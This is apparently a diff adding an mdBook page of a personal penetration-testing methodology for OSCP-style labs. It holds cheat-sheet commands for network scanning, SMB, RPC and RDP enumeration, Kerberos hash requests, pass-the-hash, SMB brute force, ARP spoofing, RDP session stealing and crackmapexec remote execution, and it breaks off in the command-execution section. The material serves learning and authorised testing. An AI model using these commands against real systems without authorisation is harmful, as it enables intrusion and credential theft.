@@ -1,0 +1,917 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>KCP Methodology</title>
+        <meta name="robots" content="noindex" />
+
+
+        <!-- Custom HTML head -->
+        
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Methodology Overview</a></li><li class="chapter-item expanded "><a href="recon/setup.html"><strong aria-hidden="true">2.</strong> Setup</a></li><li class="chapter-item expanded "><a href="recon/passive-gathering.html"><strong aria-hidden="true">3.</strong> Passive Gathering</a></li><li class="chapter-item expanded "><a href="recon/active-scanning.html"><strong aria-hidden="true">4.</strong> Active Scanning</a></li><li class="chapter-item expanded "><a href="enumeration/services/index.html"><strong aria-hidden="true">5.</strong> Services</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="enumeration/services/http-s.html"><strong aria-hidden="true">5.1.</strong> HTTP(S)</a></li><li class="chapter-item expanded "><a href="enumeration/services/rdp.html"><strong aria-hidden="true">5.2.</strong> RDP</a></li><li class="chapter-item expanded "><a href="enumeration/services/smb-139-445.html"><strong aria-hidden="true">5.3.</strong> SMB [139,445]</a></li><li class="chapter-item expanded "><a href="enumeration/services/snmp.html"><strong aria-hidden="true">5.4.</strong> SNMP</a></li></ol></li><li class="chapter-item expanded "><a href="enumeration/webapp/index.html"><strong aria-hidden="true">6.</strong> WebApp</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="enumeration/webapp/wordpress.html"><strong aria-hidden="true">6.1.</strong> Wordpress</a></li><li class="chapter-item expanded "><a href="enumeration/webapp/sqli.html"><strong aria-hidden="true">6.2.</strong> SQLi</a></li><li class="chapter-item expanded "><a href="enumeration/webapp/utilities.html"><strong aria-hidden="true">6.3.</strong> Utilities</a></li></ol></li><li class="chapter-item expanded "><a href="enumeration/active-directory/index.html"><strong aria-hidden="true">7.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="enumeration/active-directory/devices.html"><strong aria-hidden="true">7.1.</strong> Devices</a></li><li class="chapter-item expanded "><a href="enumeration/active-directory/domain.html"><strong aria-hidden="true">7.2.</strong> Domain</a></li><li class="chapter-item expanded "><a href="enumeration/active-directory/users-and-groups.html"><strong aria-hidden="true">7.3.</strong> Users & Groups</a></li><li class="chapter-item expanded "><a href="enumeration/active-directory/ldap.html"><strong aria-hidden="true">7.4.</strong> LDAP</a></li><li class="chapter-item expanded "><a href="enumeration/active-directory/kerberos.html"><strong aria-hidden="true">7.5.</strong> Kerberos</a></li></ol></li><li class="chapter-item expanded "><a href="exploit/find-fix-finish.html"><strong aria-hidden="true">8.</strong> Find, Fix, Finish</a></li><li class="chapter-item expanded "><a href="exploit/privilege-escalation.html"><strong aria-hidden="true">9.</strong> Privilege Escalation</a></li><li class="chapter-item expanded "><a href="exploit/windows.html"><strong aria-hidden="true">10.</strong> Windows</a></li><li class="chapter-item expanded "><a href="postexploitation/enumerate.html"><strong aria-hidden="true">11.</strong> Enumerate</a></li><li class="chapter-item expanded "><a href="postexploitation/loot.html"><strong aria-hidden="true">12.</strong> Loot</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">KCP Methodology</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="methodology-overview"><a class="header" href="#methodology-overview">Methodology Overview</a></h1>
+<ol>
+<li><a href="recon/active-scanning.html">Reconnaissance</a></li>
+<li><a href="enumeration/services/">Enumeration</a></li>
+<li>Exploitation</li>
+<li>Privilege Escalation</li>
+<li>Post-Exploitation</li>
+<li>Critical Information Requirements</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-pre-scanning-configuration"><a class="header" href="#description-pre-scanning-configuration">description: Pre-Scanning Configuration</a></h2>
+<h1 id="setup"><a class="header" href="#setup">Setup</a></h1>
+<h2 id="target-designation"><a class="header" href="#target-designation">Target Designation</a></h2>
+<pre><code>echo &lt;IPv4&gt; &gt; ~/.kcp/TARGET
+</code></pre>
+<h2 id="packet-capture"><a class="header" href="#packet-capture">Packet Capture</a></h2>
+<pre><code>sudo tcpdump -i tun0 -w - -U | tee /home/kali/KCP/OSCP/pcaps/$(dtg).pcap | tcpdump -r -
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="passive-gathering"><a class="header" href="#passive-gathering">Passive Gathering</a></h1>
+<h2 id="fingerprinting"><a class="header" href="#fingerprinting">Fingerprinting</a></h2>
+<p>{% embed url=&quot;https://github.com/CERT-Polska/hfinger&quot; %}
+hfinger
+{% endembed %}</p>
+<p>{% embed url=&quot;https://lcamtuf.coredump.cx/p0f3/&quot; %}
+p0f
+{% endembed %}</p>
+<p>{% embed url=&quot;https://github.com/cisco/mercury&quot; %}
+mercury
+{% endembed %}</p>
+<p>{% embed url=&quot;https://github.com/Ekultek/WhatWaf&quot; %}
+WhatWAF
+{% endembed %}</p>
+<p>{% embed url=&quot;https://github.com/0x4D31/fatt&quot; %}
+fatt
+{% endembed %}</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="active-scanning"><a class="header" href="#active-scanning">Active Scanning</a></h1>
+<h2 id="dns-scanning"><a class="header" href="#dns-scanning">DNS Scanning</a></h2>
+<pre><code class="language-shell">sudo nmap -sU -p 53 --open 192.168.X.0/24 -v -oG nameservers.txt
+cat nameservers.txt | grep 53/open/ | cut -d ' ' -f2 &gt; dnsservers.txt
+for srv in $(cat dnsservers.txt); do echo &quot;Asking $srv to lookup $TARGET:&quot;; nslookup $TARGET $srv; done
+</code></pre>
+<h3 id="dnsrecon"><a class="header" href="#dnsrecon">DNSRecon</a></h3>
+<p><code>for srv in $(cat dnsservers.txt); do dnsrecon -n $srv -a -d &lt;domain&gt;; done</code></p>
+<pre><code>dnsrecon -d &lt;domain&gt; -a
+dnsrecon -d &lt;domain&gt; -t axfr
+dnsrecon -d &lt;domain&gt; -D &lt;namelist&gt; -t brt
+dnsrecon -d &lt;startIP-endIP&gt;
+</code></pre>
+<h3 id="sublis3r"><a class="header" href="#sublis3r">Sublis3r</a></h3>
+<pre><code>sublist3r -d &lt;domain&gt;
+sublist3r -v -d &lt;domain&gt; -p 80,443
+</code></pre>
+<h3 id="owasp-amass"><a class="header" href="#owasp-amass">OWASP AMASS</a></h3>
+<pre><code>amass enum -d &lt;domain&gt;
+amass intel -whois -d &lt;domain&gt;
+amass intel -active 192.168.X.0/24 -p 80,443,8080,8443
+amass intel -ipv4 -whois -d &lt;domain&gt;
+</code></pre>
+<h2 id="network-scanning"><a class="header" href="#network-scanning">Network Scanning</a></h2>
+<h3 id="pingsweep"><a class="header" href="#pingsweep">Pingsweep</a></h3>
+<h4 id="linux"><a class="header" href="#linux">Linux</a></h4>
+<p><code>for i in {1..254} ;do (ping -c 1 172.21.10.$i | grep &quot;bytes from&quot; &amp;) ;done</code></p>
+<h4 id="windows"><a class="header" href="#windows">Windows</a></h4>
+<p><code>for /L %i in (1,1,255) do @ping -n 1 -w 200 172.21.10.%i &gt; nul &amp;&amp; echo 172.21.1.%i is up</code></p>
+<h3 id="arp"><a class="header" href="#arp">ARP</a></h3>
+<p><code>netdiscover -i tun0</code></p>
+<p><code>netdiscover -r 192.168.X.0/24</code></p>
+<h3 id="nmap"><a class="header" href="#nmap">nmap</a></h3>
+<p><code>nmap -sn 192.168.X.0/24</code></p>
+<h3 id="nbtscan"><a class="header" href="#nbtscan">nbtscan</a></h3>
+<p><code>nbtscan -r 192.168.X.0/24</code></p>
+<h2 id="host-scanning"><a class="header" href="#host-scanning">Host Scanning</a></h2>
+<pre><code>autorecon $TARGET
+</code></pre>
+<p>To restore permissions:</p>
+<pre><code>sudo chown -R kali:kali /home/kali/KCP/OSCP/results/$TARGET
+</code></pre>
+<h3 id="tcp"><a class="header" href="#tcp">TCP</a></h3>
+<p><code>sudo nmap --privileged -O --fuzzy -Pn -sC -sV -p $(sudo nmap --privileged -Pn -p 1-65535 -sS --min-rate=1000 -T4 $target 2&gt;/dev/null | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') $TARGET -oX nmap-tcp-${TARGET}.xml</code></p>
+<h4 id="stealth"><a class="header" href="#stealth">Stealth</a></h4>
+<p><code>nmap -sS -sC -sV $TARGET</code></p>
+<p><code>nmap -sS -p- $TARGET</code></p>
+<h3 id="udp"><a class="header" href="#udp">UDP</a></h3>
+<p><code>sudo nmap --privileged -Pn -sC -sV -sU -p $(sudo nmap --privileged -Pn -p 1-65535 -sU --min-rate=1000 -T4 $target 2&gt;/dev/null | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') $TARGET -oX nmap-udp-${TARGET}.xml</code></p>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-service-enumeration"><a class="header" href="#description-service-enumeration">description: Service Enumeration</a></h2>
+<h1 id="services"><a class="header" href="#services">Services</a></h1>
+<h2 id="active-directory"><a class="header" href="#active-directory">Active Directory</a></h2>
+<p>{% content-ref url=&quot;../active-directory/&quot; %}
+<a href="enumeration/services/../active-directory/">active-directory</a>
+{% endcontent-ref %}</p>
+<h2 id="ftp"><a class="header" href="#ftp">FTP</a></h2>
+<pre><code>$ ls -lh /usr/share/nmap/scripts/ | grep ftp
+-rw-r--r-- 1 root root 4.5K Oct 12 09:29 ftp-anon.nse
+-rw-r--r-- 1 root root 3.2K Oct 12 09:29 ftp-bounce.nse
+-rw-r--r-- 1 root root 3.1K Oct 12 09:29 ftp-brute.nse
+-rw-r--r-- 1 root root 3.2K Oct 12 09:29 ftp-libopie.nse
+-rw-r--r-- 1 root root 3.3K Oct 12 09:29 ftp-proftpd-backdoor.nse
+-rw-r--r-- 1 root root 3.7K Oct 12 09:29 ftp-syst.nse
+-rw-r--r-- 1 root root 5.9K Oct 12 09:29 ftp-vsftpd-backdoor.nse
+-rw-r--r-- 1 root root 5.8K Oct 12 09:29 ftp-vuln-cve2010-4221.nse
+-rw-r--r-- 1 root root 5.7K Oct 12 09:29 tftp-enum.nse
+</code></pre>
+<h2 id="https"><a class="header" href="#https">HTTP(S)</a></h2>
+<p>{% content-ref url=&quot;http-s.md&quot; %}
+<a href="enumeration/services/http-s.html">http-s.md</a>
+{% endcontent-ref %}</p>
+<h2 id="mail"><a class="header" href="#mail">MAIL</a></h2>
+<h3 id="smtp-25465587"><a class="header" href="#smtp-25465587">SMTP [25,465,587]</a></h3>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp</a></p>
+<h3 id="imap-143993"><a class="header" href="#imap-143993">IMAP [143,993]</a></h3>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap</a></p>
+<h3 id="pop3-110995"><a class="header" href="#pop3-110995">POP3 [110,995]</a></h3>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop">https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop</a></p>
+<h2 id="netbios"><a class="header" href="#netbios">NetBIOS</a></h2>
+<pre><code>nbtscan $TARGET
+nmap --script nbstat.nse $TARGET
+nmap --script smb-os-discovery $TARGET
+nmblookup -A $TARGET
+enum4linux -a $TARGET
+</code></pre>
+<h2 id="msrpc"><a class="header" href="#msrpc">(MS)RPC</a></h2>
+<pre><code>rpcinfo $TARGET -p
+rpcinfo $TARGET -s
+rpcclient -U &quot;&quot; -N $TARGET
+
+#Dump user information
+/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;
+/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;
+
+#Map possible RPC endpoints
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]&lt;targetName or address&gt;
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]&lt;targetName or address&gt;
+/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]&lt;targetName or address&gt;
+
+#connect with username &amp; hash
+rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
+
+#authenticate against kerberos
+rpcclient -k ws01win10.domain.com
+
+#while connected to rpcclient
+List domains: enumdomains
+Get SID: lsaquery
+Domain info: querydominfo
+List users: querydispinfo and enumdomusers
+Get user details: queryuser &lt;0xrid&gt;
+Get user groups: queryusergroups &lt;0xrid&gt;
+GET SID of a user: lookupnames &lt;username&gt;
+Get users aliases: queryuseraliases [builtin|domain] &lt;sid&gt;
+List groups: enumdomgroups
+Get group details: querygroup &lt;0xrid&gt;
+Get group members: querygroupmem &lt;0xrid&gt;
+Find SIDs by name: lookupnames &lt;username&gt;
+Find more SIDs: lsaenumsid
+RID cycling (check more SIDs): lookupsids &lt;sid&gt;
+List alias: enumalsgroups &lt;builtin|domain&gt;
+Get members: queryaliasmem builtin|domain &lt;0xrid&gt;
+</code></pre>
+<h2 id="rdp"><a class="header" href="#rdp">RDP</a></h2>
+<p>{% content-ref url=&quot;rdp.md&quot; %}
+<a href="enumeration/services/rdp.html">rdp.md</a>
+{% endcontent-ref %}</p>
+<h2 id="snmp"><a class="header" href="#snmp">SNMP</a></h2>
+<p>{% content-ref url=&quot;snmp.md&quot; %}
+<a href="enumeration/services/snmp.html">snmp.md</a>
+{% endcontent-ref %}</p>
+<h2 id="smb"><a class="header" href="#smb">SMB</a></h2>
+<p>{% content-ref url=&quot;smb-139-445.md&quot; %}
+<a href="enumeration/services/smb-139-445.html">smb-139-445.md</a>
+{% endcontent-ref %}</p>
+<h2 id="mymssql"><a class="header" href="#mymssql">(my/ms)SQL</a></h2>
+<p><a href="https://www.mysqltutorial.org/mysql-cheat-sheet.aspx">https://www.mysqltutorial.org/mysql-cheat-sheet.aspx</a></p>
+<h3 id="msql"><a class="header" href="#msql">m*sql</a></h3>
+<pre><code>mysql -u&lt;USER&gt; -p&lt;PASS&gt; -e '&lt;CMD&gt;;'
+
+sqsh -S&lt;config&gt; -D&lt;database&gt; -U &lt;domain&gt;\\&lt;user&gt; -P &lt;password / hash&gt;
+</code></pre>
+<pre><code>sudo nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $TARGET -oX scans/xml/nmapsqlscripts.xml | tee scans/tcp3306/nmapsqlscripts.txt
+</code></pre>
+<h3 id="nosql"><a class="header" href="#nosql"><code>noSQL</code></a></h3>
+<p><code>[`https://github.com/codingo/NoSQLMap`](https://github.com/codingo/NoSQLMap)</code></p>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-web-service-enumeration"><a class="header" href="#description-web-service-enumeration">description: Web Service Enumeration</a></h2>
+<h1 id="https-1"><a class="header" href="#https-1">HTTP(S)</a></h1>
+<h2 id="general-enumeration"><a class="header" href="#general-enumeration">General Enumeration</a></h2>
+<h3 id="sitemap"><a class="header" href="#sitemap">sitemap</a></h3>
+<pre><code>curl http://${TARGET}:80/sitemap.xml -o /home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/sitemap.xml
+</code></pre>
+<h3 id="robots"><a class="header" href="#robots">robots</a></h3>
+<pre><code>curl http://${TARGET}:80/robots.txt -o /home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/robots.txt
+</code></pre>
+<h3 id="whatweb"><a class="header" href="#whatweb">whatweb</a></h3>
+<pre><code>whatweb --log-brief=/home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/tcp_80_http_whatweb.txt -v $TARGET
+</code></pre>
+<h3 id="nikto"><a class="header" href="#nikto">nikto</a></h3>
+<pre><code>nikto -ask=no -h http://${TARGET}:80 2&gt;&amp;1 | tee &quot;/home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/tcp_80_http_nikto.txt&quot;
+</code></pre>
+<h3 id="feroxbuster"><a class="header" href="#feroxbuster">feroxbuster</a></h3>
+<pre><code>feroxbuster -u http://${TARGET}:80 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &quot;txt,html,php,asp,aspx,jsp&quot; -v -k -n -e -o /home/kali/KCP/OSCP/results/${TARGET}/scans/tcp80/tcp_80_http_feroxbuster_dirbuster.txt
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-remote-desktop-protocol-enumeration"><a class="header" href="#description-remote-desktop-protocol-enumeration">description: Remote Desktop Protocol Enumeration</a></h2>
+<h1 id="rdp-1"><a class="header" href="#rdp-1">RDP</a></h1>
+<h2 id="stickykeys"><a class="header" href="#stickykeys">stickykeys</a></h2>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp</a></p>
+<h2 id="nmap-checks-encryption--ntlm"><a class="header" href="#nmap-checks-encryption--ntlm">nmap (checks encryption &amp; ntlm)</a></h2>
+<pre><code>nmap --script &quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot; -p 3389 -T4 $TARGET
+</code></pre>
+<h2 id="rdp_check-test-credentials"><a class="header" href="#rdp_check-test-credentials">rdp_check (test credentials)</a></h2>
+<pre><code>rdp_check &lt;domain&gt;/&lt;name&gt;:&lt;password&gt;@$TARGET
+</code></pre>
+<h2 id="rdesktop-connect"><a class="header" href="#rdesktop-connect">rdesktop (connect)</a></h2>
+<pre><code>rdesktop -u &lt;username&gt; [-p &lt;password&gt;] [-d &lt;domain&gt;] $TARGET
+</code></pre>
+<h2 id="once-connected"><a class="header" href="#once-connected">Once Connected:</a></h2>
+<h3 id="runas-another-user"><a class="header" href="#runas-another-user">runas (another user)</a></h3>
+<pre><code>runas /netonly /user:&lt;DOMAIN&gt;\&lt;NAME&gt; &quot;cmd.exe&quot; #The password will be prompted
+</code></pre>
+<h3 id="session-stealing"><a class="header" href="#session-stealing">Session stealing</a></h3>
+<pre><code>query user #check open sessions
+tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt; #access selected session
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><hr />
+<h2 id="description-server-message-block-service-enumeration"><a class="header" href="#description-server-message-block-service-enumeration">description: Server Message Block service enumeration</a></h2>
+<h1 id="smb-139445"><a class="header" href="#smb-139445">SMB [139,445]</a></h1>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb">HackTricks</a></p>
+<p>Common share names for windows targets are</p>
+<ul>
+<li>C$</li>
+<li>D$</li>
+<li>ADMIN$</li>
+<li>IPC$
+<ul>
+<li>Access to IPC$ gives access to named pipes</li>
+</ul>
+</li>
+<li>PRINT$</li>
+<li>FAX$</li>
+<li>SYSVOL</li>
+<li>NETLOGON</li>
+</ul>
+<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
+<pre><code>nbtscan -r 192.168.X.0/24 #network
+nbtscan $TARGET
+smbver.sh $TARGET &lt;139/445&gt;
+hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb
+</code></pre>
+<pre><code>ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
+smbmap -H &lt;ip&gt; -u '' -p '' -P 139 
+</code></pre>
+<h3 id="crackmapexec"><a class="header" href="#crackmapexec">crackmapexec</a></h3>
+<pre><code>crackmapexec smb {IP}
+crackmapexec smb {IP} --pass-pol -u &quot;&quot; -p &quot;&quot;
+crackmapexec smb {IP} --pass-pol -u &quot;guest&quot; -p &quot;&quot;
+crackmapexec smb &lt;IP&gt; -u '' -p '' --shares #Null user
+crackmapexec smb &lt;IP&gt; -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb &lt;IP&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user
+</code></pre>
+<h3 id="enum4linux"><a class="header" href="#enum4linux">enum4linux</a></h3>
+<pre><code>enum4linux -a {IP}
+</code></pre>
+<h3 id="impacket"><a class="header" href="#impacket">Impacket</a></h3>
+<h4 id="getaduserspy"><a class="header" href="#getaduserspy">GetADUsers.py</a></h4>
+<pre><code>GetADUsers.py -dc-ip {IP} &quot;{Domain_Name}/&quot; -all
+</code></pre>
+<h4 id="getarchpy"><a class="header" href="#getarchpy">getArch.py</a></h4>
+<pre><code>getArch.py -target {IP}
+</code></pre>
+<h4 id="getnpuserspy"><a class="header" href="#getnpuserspy">GetNPUsers.py</a></h4>
+<pre><code>GetNPUsers.py -dc-ip {IP} -request &quot;{Domain_Name}/&quot; -format hashcat
+</code></pre>
+<h4 id="getuserspnspy"><a class="header" href="#getuserspnspy">GetUserSPNs.py</a></h4>
+<pre><code>GetUserSPNs.py -dc-ip {IP} -request &quot;{Domain_Name}/&quot;
+</code></pre>
+<h4 id="lookupsidpy"><a class="header" href="#lookupsidpy">lookupsid.py</a></h4>
+<p>enumerate local users</p>
+<pre><code>lookupsid.py -no-pass hostname.local
+</code></pre>
+<h4 id="regpy"><a class="header" href="#regpy">reg.py</a></h4>
+<p>read registry entries with username and hash</p>
+<pre><code>sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
+sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
+</code></pre>
+<h3 id="nmap-1"><a class="header" href="#nmap-1">nmap</a></h3>
+<pre><code>nmap --script smb-vuln* -Pn -p 139,445 {IP}
+</code></pre>
+<h3 id="smbclient"><a class="header" href="#smbclient">smbclient</a></h3>
+<pre><code>smbclient -U '%' -L //&lt;DC IP&gt; &amp;&amp; smbclient -U 'guest%' -L //
+
+#list shared folders
+smbclient --no-pass -L //&lt;IP&gt; # Null user
+smbclient -N //{IP}/ --option=&quot;client min protocol&quot;=LANMAN1
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //&lt;IP&gt; #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+
+#connect
+smbclient --no-pass //&lt;IP&gt;/&lt;Folder&gt;
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //&lt;IP&gt; #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient
+
+#authenticate against kerberos
+smbclient --kerberos //ws01win10.domain.com/C$
+</code></pre>
+<h3 id="smbmap"><a class="header" href="#smbmap">smbmap</a></h3>
+<pre><code>smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;DC IP&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;DC IP&gt;
+
+#list shared folders
+smbmap -H &lt;IP&gt; [-P &lt;PORT&gt;] #Null user
+smbmap -H {IP} -u null -p null
+smbmap -H {IP} -u guest
+smbmap -u &quot;username&quot; -p &quot;password&quot; -H &lt;IP&gt; [-P &lt;PORT&gt;] #Creds
+smbmap -u &quot;username&quot; -p &quot;&lt;NT&gt;:&lt;LM&gt;&quot; -H &lt;IP&gt; [-P &lt;PORT&gt;] #Pass-the-Hash
+
+#connect (without folder it list everything)
+smbmap [-u &quot;username&quot; -p &quot;password&quot;] -R [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Recursive list
+smbmap [-u &quot;username&quot; -p &quot;password&quot;] -r [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] # Non-Recursive list
+smbmap -u &quot;username&quot; -p &quot;&lt;NT&gt;:&lt;LM&gt;&quot; [-r/-R] [Folder] -H &lt;IP&gt; [-P &lt;PORT&gt;] #Pass-the-Hash
+</code></pre>
+<h3 id="smbtrap"><a class="header" href="#smbtrap">SMBTrap</a></h3>
+<p><a href="https://github.com/byt3bl33d3r/MITMf">MITMf</a></p>
+<pre><code>python mitmf.py --arp --spoof --smbtrap --target $TARGET --gateway GATEWAY -i tun0
+</code></pre>
+<h2 id="command-execution"><a class="header" href="#command-execution">Command Execution</a></h2>
+<h3 id="atexec"><a class="header" href="#atexec">atexec</a></h3>
+<h3 id="crackmapexec-1"><a class="header" href="#crackmapexec-1">crackmapexec</a></h3>
+<pre><code>crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
